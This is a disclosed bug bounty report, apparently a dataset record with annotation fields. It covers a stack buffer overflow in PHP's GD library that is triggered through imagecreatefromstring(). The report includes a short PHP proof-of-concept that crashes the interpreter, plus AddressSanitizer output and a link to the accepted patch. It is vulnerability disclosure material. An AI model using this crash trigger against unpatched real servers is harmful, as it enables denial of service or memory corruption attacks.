{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "libnex ",
  "title": "Stack Buffer Overflow in GD dynamicGetbuf",
  "content": "\nStack-based buffer over flow in GD dynamicGetbuf#\nVulnerable function: imagecreatefromstring()\nBug has been reported: https://bugs.php.net/bug.php?id=73280\nSubmitted a patch and accepted: https://github.com/php/php-src/commit/cc08cbc84d46933c1e9e0149633f1ed5d19e45e9\nImpact: Remotely Exploitable. Given the nature of the function, it is not uncommon to see programmers passing user inputs to the vulnerable function imagecreatefromstring(). Real life examples:\nhttps://github.com/rbloone/sslv-scraper/blob/305c79e24421795abdae8106ad686cb9c6742e94/img.php\nhttps://github.com/hick/utl/blob/a573f04ac0a6db2cfe56e2785dfab7b1534c04f3/pasteimage/file.php\nhttps://github.com/rbloone/sslv-scraper/blob/305c79e24421795abdae8106ad686cb9c6742e94/img.php\nhttps://github.com/hick/utl/blob/a573f04ac0a6db2cfe56e2785dfab7b1534c04f3/pasteimage/file.php\nDescription:\n1) imagecreatefromstring() takes in a string and attempts to convert it into an image. The string is in the variable \"data\" and the length is stored as size_t (unsigned) within a zend_string structure as seen below. When passed into gdNewDynamicCtxEx(), it gets converted implicitly into an int (signed). If the MSB of the size_t is 1, when converting to an int, this becomes a negative number.\n_php_image_create_from_string(...) at php-7.0.11/ext/gd/gd.c:2227\nCode 87 Bytes\n12227                 io_ctx = gdNewDynamicCtxEx(Z_STRLEN_P(data), Z_STRVAL_P(data), 0);\n2) Tracing the code deeper, the size is set to dp (dynamicPtr) below\nallocDynamic(...) at ext/gd/libgd/gd_io_dp.c:272\nCode 50 Bytes\n1280                 dp->logicalSize = initialSize;\n3) During the image conversion, dynamicGetchar() gets called to read 1 byte (line 257).\ndynamicGetchar(..) at ext/gd/libgd/gd_io_dp.c\nCode 113 Bytes\n1\t254             unsigned char b;\n2\t255             int rv;\n3\t256\n4\t257             rv = dynamicGetbuf (ctx, &b, 1);\n4) Tracing into dynamicGetbuf(), because \"remain\" (line 236) is negative due to the int conversion, line 243 gets executed and more than 1 byte will be memcpy (line 246). This memcpy would copy bytes to \"bu\"f which is 1-byte char on the stack. This results in a stack buffer over flow.\ndynamicGetbuf (gdIOCtxPtr ctx, void *buf, int len) at ext/gd/libgd/gd_io_dp.c:237\nCode 394 Bytes\n1236             remain = dp->logicalSize - dp->pos;\n2237             if (remain >= len) {\n3238                     rlen = len;\n4239             } else {\n5240                     if (remain == 0) {\n6241                             return EOF;\n7242                     }\n8243                     rlen = remain;\n9244             }\n10245\n11246         memcpy(buf, (void *) ((char *) dp->data + dp->pos), rlen);\nTest script:\nCode 353 Bytes\n1<?php\n2ini_set('memory_limit',-1);\n3$var_3  =  str_repeat(\"A\",4294967286); //Note that although this is a large string, over HTTP gz compression, it's going to be less than 1kb\n4$var_3[0]=\"\\x00\";\n5$var_3[1]=\"\\x00\";\n6$var_3[2]=\"\\x00\";\n7$var_3[3]=\"\\x00\";\n8$var_3[4]=\"\\x00\";\n9$var_3[5]=\"\\x00\";\n10$var_3[6]=\"\\x00\";\n11$var_3[7]=\"\\x00\";\n12imagecreatefromstring($var_3);\n13\n14?>\n$> ./php-7.0.11 test.php\nSegmentation fault\nAddress Sanitizer result\nCode 516 Bytes\n1ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffd246d5520 at pc 0x99119a bp 0x7ffd246d5480 sp 0x7ffd246d5478\n2WRITE of size 18446744073709551606 at 0x7ffd246d5520 thread T0\n3    #0 0x991199 in dynamicGetbuf /home/elaw/php-7.0.9/ext/gd/libgd/gd_io_dp.c:246\n4    #1 0x991263 in dynamicGetchar /home/elaw/php-7.0.9/ext/gd/libgd/gd_io_dp.c:257\n5    #2 0x98feaf in php_gd_gdGetC /home/elaw/php-7.0.9/ext/gd/libgd/gd_io.c:73\n6    #3 0x9a501c in php_gd_gd_getin /home/elaw/php-7.0.9/ext/gd/libgd/gd_wbmp.c:81\n7....\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 1500,
  "weaknesses": [
    "Memory Corruption - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1573568760,
  "report_url": "https://hackerone.com/reports/175587",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a large string (4GB+) with specific null bytes at the beginning"
    ],
    [
      2,
      "Pass this string to imagecreatefromstring() function in PHP"
    ]
  ],
  "vuln_description": "A stack buffer overflow vulnerability exists in PHP's GD library through the imagecreatefromstring() function. The vulnerability occurs due to improper handling of large image data strings (4GB+), where a signed/unsigned integer conversion error leads to a negative value being used in a memory copy operation, resulting in stack corruption.",
  "reason": "While the vulnerability involves understanding integer conversion issues and memory operations, the core issue is relatively straightforward once identified. The attack vector is simple (passing a large string) and doesn't require complex application state manipulation or novel logic. The main complexity comes from recognizing the integer conversion issue in the GD library's internal functions.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}